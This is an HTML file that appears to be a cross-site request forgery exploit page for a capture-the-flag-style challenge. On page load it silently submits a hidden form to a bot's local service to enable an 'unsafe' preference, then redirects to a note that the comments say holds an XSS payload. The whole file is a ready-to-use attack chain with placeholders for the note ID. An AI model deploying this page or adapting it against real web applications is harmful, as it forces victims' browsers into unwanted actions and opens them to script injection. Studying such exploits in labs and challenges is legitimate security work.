<!-- filepath: exploit.html -->
<html>
  <head>
    <title>CSRF Trigger</title>
  </head>
  <body onload="triggerExploit()">
    <p>Please wait...</p>
    <!-- The iframe targets the bot's local address for /prefs/unsafe -->
    <iframe name="csrfFrame" style="display:none;"></iframe>
    <form id="csrfForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST" target="csrfFrame">
      <!-- === REPLACE YOUR_XSS_NOTE_ID BELOW === -->
      <input type="hidden" name="id" value="1" />
      <input type="hidden" name="enable" value="1" />
    </form>
    <script>
      function triggerExploit() {
        document.getElementById('csrfForm').submit();
        setTimeout(function() {
          // This redirect also needs to use the bot's local address for the notes
          // === REPLACE YOUR_XSS_NOTE_ID BELOW ===
          window.location.href = "http://127.0.0.1:7189/notes/1";
        }, 2500); // Increased delay slightly
      }
    </script>
  </body>
</html>
